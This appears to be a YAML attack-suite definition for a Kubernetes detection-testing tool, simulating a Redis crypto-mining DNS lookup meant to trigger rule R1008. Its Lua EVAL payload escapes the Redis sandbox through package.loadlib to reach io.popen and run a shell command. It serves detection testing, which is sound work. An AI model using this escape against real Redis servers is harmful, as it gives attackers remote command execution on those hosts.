apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-attack-10-crypto-mining-dns
  description: "DNS lookup to known crypto mining pool via getent. Triggers R1008."
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis
attacks:
  - name: crypto-mining-dns
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return 'sandbox_blocked' end
        local f = io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done')
        local out = f:read('*a')
        f:close()
        return 'mining_dns:' .. out
    successIndicators:
      - responseContains: "mining_dns:"
expectedDetections:
  - attackType: fileless
    ruleID: R1008
    ruleName: "Crypto Mining Domain Communication"
    containerName: redis
